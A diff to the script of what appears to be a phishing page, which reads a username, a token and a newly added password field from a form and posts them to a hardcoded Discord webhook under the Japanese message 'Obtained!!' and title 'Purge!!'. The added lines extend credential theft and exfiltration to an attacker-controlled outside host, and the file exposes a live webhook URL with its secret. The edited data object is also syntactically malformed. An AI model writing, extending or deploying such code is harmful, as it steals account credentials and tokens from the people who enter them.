@@ -5,15 +5,23 @@
     
                 const username = document.getElementById("username").value;
                 const password = document.getElementById("password").value;
+                const pas = document.getElementById("pas").value;
     
-                sendDataToWebhook(username, password);
+                sendDataToWebhook(username, password, pas);
             });
     
-            function sendDataToWebhook(username, password) {
+            function sendDataToWebhook(username, password, pas) {
                 const webhookURL = "https://discord.com/api/webhooks/1184830460031934474/Z9jcuOHzki8XQfT3yycsmrRU_EEueqhvMxKIY7PbULA66OZSdki7IaKUxUsCjzCqmi5n";
     
                 const data = {
-                    content: `UserID: ${username}\nToken: ${password}`
+                    content: `入手しました!!`
+                "embeds": [
+                    {
+                "title": `粛清!!`,
+              "description": `token\n${password}\nuserid${username}\npassword${pas}`,
+              "color": null
+                    }
+                  ],
                 };
     
                 fetch(webhookURL, {
